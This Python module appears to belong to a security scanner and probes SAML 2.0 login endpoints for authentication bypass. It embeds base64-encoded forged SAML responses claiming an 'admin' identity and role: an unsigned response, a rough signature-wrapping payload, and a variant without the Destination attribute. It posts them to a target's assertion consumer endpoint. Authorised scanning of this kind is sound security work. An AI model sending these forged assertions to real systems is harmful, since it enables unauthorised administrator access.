"""SAML 2.0 validator.

Detects SAML misconfigurations: missing assertion signature enforcement,
XML signature wrapping attacks, response manipulation, and
recipient/audience validation bypass.
"""

from __future__ import annotations

import base64
import logging
from typing import Any, Callable

from src.core.scoring import ScoringConfig, bounded_confidence
from src.execution.validators.status import ValidationStatus

logger = logging.getLogger(__name__)

# Base64-encoded minimal SAML response templates
_B64_SAML_EMPTY_RESPONSE = (
    "PD94bWwgdmVyc2lvbj0iMS4wIj8+CjxzYW1scDpSZXNwb25zZSB4bWxuczpzYW1scD0idXJuOm9h"
    "c2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIgogICAgeG1sbnM6c2FtbD0idXJuOm9hc2lz"
    "Om5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiIKICAgIElEPSJfMTIzNDUiCiAgICBWZXJzaW9u"
    "PSIyLjAiCiAgICBJc3N1ZUluc3RhbnQ9IjIwMjQtMDEtMDFUMDA6MDA6MDBaIgogICAgRGVzdGlu"
    "YXRpb249Imh0dHBzOi8vc2VydmljZXByb3ZpZGVyLmNvbS9zYW1sL2FjcyI+CiAgICA8c2FtbDpJ"
    "c3N1ZXI+aHR0cHM6Ly9pZHBwLmNvbTwvc2FtbDpJc3N1ZXI+CiAgICA8c2FtbHA6U3RhdHVzPgog"
    "ICAgICAgIDxzYW1scDpTdGF0dXNDb2RlIFZhbHVlPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoy"
    "LjA6c3RhdHVzOlN1Y2Nlc3MiLz4KICAgIDwvc2FtbHA6U3RhdHVzPgogICAgPHNhbWw6QXNzZXJ0"
    "aW9uCiAgICAgICAgSUQ9Il9hc3NlcnRpb24xMjMiCiAgICAgICAgVmVyc2lvbj0iMi4wIgogICAg"
    "ICAgIElzc3VlSW5zdGFudD0iMjAyNC0wMS0wMVQwMDowMDowMFoiPgogICAgICAgIDxzYW1sOklz"
    "c3Vlcj5odHRwczovL2lkcHAuY29tPC9zYW1sOklzc3Vlcj4KICAgICAgICA8c2FtbDpTdWJqZWN0"
    "PgogICAgICAgICAgICA8c2FtbDpOYW1lSUQKICAgICAgICAgICAgICAgIFNBTUwyLnByaW5jaXBh"
    "bC10eXBlPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWN0aW9uOnN1YmplY3Q6YWNjb3Vu"
    "dCI+CiAgICAgICAgICAgICAgICBhZG1pbgogICAgICAgICAgICA8L3NhbWw6TmFtZUlEPgogICAg"
    "ICAgIDwvc2FtbDpTdWJqZWN0PgogICAgICAgIDxzYW1sOkF0dHJpYnV0ZVN0YXRlbWVudD4KICAg"
    "ICAgICAgICAgPHNhbWw6QXR0cmlidXRlIE5hbWU9InJvbGUiPgogICAgICAgICAgICAgICAgPHNh"
    "bWw6QXR0cmlidXRlVmFsdWU+YWRtaW48L3NhbWw6QXR0cmlidXRlVmFsdWU+CiAgICAgICAgICAg"
    "IDwvc2FtbDpBdHRyaWJ1dGU+CiAgICAgICAgPC9zYW1sOkF0dHJpYnV0ZVN0YXRlbWVudD4KICAg"
    "IDwvc2FtbDpBc3NlcnRpb24+CiAgICA8c2FtbHA6QXNzZXJ0aW9uPgogICAgICAgIDxzYW1sOkVu"
    "Y3J5cHRlZEFzc2VydGlvbj4KICAgICAgICAgICAgPCEtLSBmYWtlIGVuY3J5cHRlZCBkYXRhIC0t"
    "PgogICAgICAgICAgICBGYWtlRW5jcnlwdGVkRGF0YUhlemUxMjM0NTY3ODkwMTIzNDU2Nzg5MAoJ"
    "CSAgICAgICAgPC9zYW1sOkVuY3J5cHRlZEFzc2VydGlvbj4KICAgIDwvc2FtbHA6QXNzZXJ0aW9u"
    "Pgo8L3NhbWxwOlJlc3BvbnNlPg=="
)

_B64_SAML_SIGNATURE_WRAPPING = (
    "PD94bWwgdmVyc2lvbj0iMS4wIj8+CjxzYW1scDpSZXNwb25zZSB4bWxuczpzYW1scD0idXJuOm9h"
    "c2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIgogICAgeG1sbnM6c2FtbD0idXJuOm9hc2lz"
    "Om5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiIKICAgIElEPSJfcmVzcG9uc2UxMjMiCiAgICBW"
    "ZXJzaW9uPSIyLjAiCiAgICBJc3N1ZUluc3RhbnQ9IjIwMjQtMDEtMDFUMDA6MDA6MDBaIgogICAg"
    "RGVzdGluYXRpb249Imh0dHBzOi8vc2VydmljZXByb3ZpZGVyLmNvbS9zYW1sL2FjcyI+CiAgICA8"
    "c2FtbDpJc3N1ZXI+aHR0cHM6Ly9pZHBwLmNvbTwvc2FtbDpJc3N1ZXI+CiAgICA8ZHNpZzpTaWdu"
    "YXR1cmUgeG1sbnM6ZHNpZz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+CiAg"
    "ICAgICAgPHNhbWw6QXNzZXJ0aW9uPgogICAgICAgICAgICA8IS0tIEZBS0UgYXNzZXJ0aW9uIHRo"
    "YXQgd2lsbCBiZSB1c2VkIGJ5IHRoZSBzcCAtLT4KICAgICAgICAgICAgPHNhbWw6U3ViamVjdD4K"
    "ICAgICAgICAgICAgICAgIDxzYW1sOk5hbWVJRCBTQU1MMi5wcmluY2lwYWwtdHlwZT0idXJuOm9h"
    "c2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjdGlvbjpzdWJqZWN0OmFjY291bnQiPgogICAgICAgICAg"
    "ICAgICAgICAgIGFkbWluCiAgICAgICAgICAgICAgICA8L3NhbWw6TmFtZUlEPgogICAgICAgICAg"
    "ICA8L3NhbWw6U3ViamVjdD4KICAgICAgICAgICAgPHNhbWw6QXR0cmlidXRlU3RhdGVtZW50Pgog"
    "ICAgICAgICAgICAgICAgIDxzYW1sOkF0dHJpYnV0ZSBOYW1lPSJyb2xlIj4KICAgICAgICAgICAg"
    "ICAgICAgICA8c2FtbDpBdHRyaWJ1dGVWYWx1ZT5hZG1pbjwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT4K"
    "ICAgICAgICAgICAgICAgIDwvc2FtbDpBdHRyaWJ1dGU+CiAgICAgICAgICAgIDwvc2FtbDpBdHRy"
    "aWJ1dGVTdGF0ZW1lbnQ+CiAgICAgICAgPC9zYW1sOkFzc2VydGlvbj4KICAgIDwvZHNpZzpTaWdu"
    "YXR1cmU+CiAgICA8c2FtbHA6U3RhdHVzPgogICAgICAgIDxzYW1scDpTdGF0dXNDb2RlIFZhbHVl"
    "PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6c3RhdHVzOlN1Y2Nlc3MiLz4KICAgIDwvc2Ft"
    "bHA6U3RhdHVzPgo8L3NhbWxwOlJlc3BvbnNlPg=="
)


def _b64_decode(b64: str) -> str:
    """Decode a base64 string, padding if necessary."""
    padding = 4 - len(b64) % 4
    if padding != 4:
        b64 += "=" * padding
    try:
        return base64.b64decode(b64).decode("utf-8", errors="replace")
    except Exception as exc:
        logger.debug("SAML base64 decode failed: %s", exc)
        return ""


SAML_EMPTY_RESPONSE = _b64_decode(_B64_SAML_EMPTY_RESPONSE)
SAML_SIGNATURE_WRAPPING_RESPONSE = _b64_decode(_B64_SAML_SIGNATURE_WRAPPING)


def _check_xml_signature_wrapping(body: str) -> bool:
    """Heuristic check for signature wrapping vulnerability."""
    lowered = body.lower()
    return "signature" in lowered and "assertion" in lowered and "subject" in lowered


def evaluate_saml(
    *,
    acs_endpoint: str | None = None,
    scorings: ScoringConfig | None = None,
    http_request: Callable[[str, str, dict[str, str] | None], dict[str, Any]] | None = None,
    in_scope: bool = True,
) -> dict[str, Any]:
    """Evaluate a SAML 2.0 endpoint for security weaknesses.

    Args:
        acs_endpoint: SAML Assertion Consumer Service URL.
        scorings: Scoring config.
        http_request: HTTP callable.
        in_scope: Whether the target is in scope.

    Returns:
        Dict with status/confidence/signals/evidence.
    """
    signals: list[str] = []
    bonuses: list[float] = []
    notes: list[str] = []
    responses: dict[str, Any] = {}

    if http_request is None or not acs_endpoint:
        return {
            "status": ValidationStatus.INCONCLUSIVE.value,
            "confidence": 0.0,
            "signals": [],
            "evidence": {"reason": "no_endpoint_or_callable"},
            "bonuses": [],
        }

    scoring = scorings or ScoringConfig()

    if in_scope:
        # Test with empty/malformed SAML response
        try:
            resp = http_request(
                "POST",
                acs_endpoint,
                {"SAMLResponse": base64.b64encode(SAML_EMPTY_RESPONSE.encode()).decode()},
            )
            responses["empty_response"] = {
                "status_code": resp.get("status_code", 0),
                "body_preview": str(resp.get("body", ""))[:150],
            }
            body = str(resp.get("body", "") or "")
            if resp.get("status_code") == 200 or "authenticated" in body.lower():
                signals.append("saml_empty_response_accepted")
                bonuses.append(0.20)
                notes.append("Empty SAML response accepted - assertion signature not enforced?")
        except Exception as exc:
            logger.debug("SAML empty response test failed for %s: %s", acs_endpoint, exc)

        # Test with XML signature wrapping payload
        try:
            resp = http_request(
                "POST",
                acs_endpoint,
                {"SAMLResponse": base64.b64encode(SAML_SIGNATURE_WRAPPING_RESPONSE.encode()).decode()},
            )
            responses["signature_wrapping"] = {
                "status_code": resp.get("status_code", 0),
                "body_preview": str(resp.get("body", ""))[:150],
            }
            body = str(resp.get("body", "") or "")
            if resp.get("status_code") == 200 or "authenticated" in body.lower():
                signals.append("saml_signature_wrapping")
                bonuses.append(0.22)
                notes.append("SAML XML signature wrapping attack may be possible.")
        except Exception as exc:
            logger.debug("SAML signature wrapping test failed for %s: %s", acs_endpoint, exc)

        # Test missing Destination attribute
        try:
            resp = http_request(
                "POST",
                acs_endpoint,
                {"SAMLResponse": base64.b64encode(
                    SAML_EMPTY_RESPONSE.replace('Destination="', 'Dest="').encode()
                ).decode()},
            )
            responses["missing_destination"] = {
                "status_code": resp.get("status_code", 0),
                "body_preview": str(resp.get("body", ""))[:150],
            }
            body = str(resp.get("body", "") or "")
            if resp.get("status_code") == 200 or "authenticated" in body.lower():
                signals.append("saml_destination_bypass")
                bonuses.append(0.15)
                notes.append("SAML response without Destination attribute was accepted.")
        except Exception as exc:
            logger.debug("SAML missing Destination test failed for %s: %s", acs_endpoint, exc)

    if signals:
        high_risk = any(s in ("saml_empty_response_accepted", "saml_signature_wrapping") for s in signals)
        status = ValidationStatus.CONFIRMED.value if high_risk else ValidationStatus.HEURISTIC.value
    else:
        status = ValidationStatus.INCONCLUSIVE.value

    total_bonus = sum(bonuses)
    confidence = bounded_confidence(base=scoring.base, cap=scoring.cap, bonuses=[total_bonus])

    evidence = {
        "acs_endpoint": acs_endpoint,
        "signals": signals,
        "notes": notes,
        "responses": responses,
    }

    return {
        "status": status,
        "confidence": confidence,
        "signals": signals,
        "evidence": evidence,
        "bonuses": bonuses,
    }
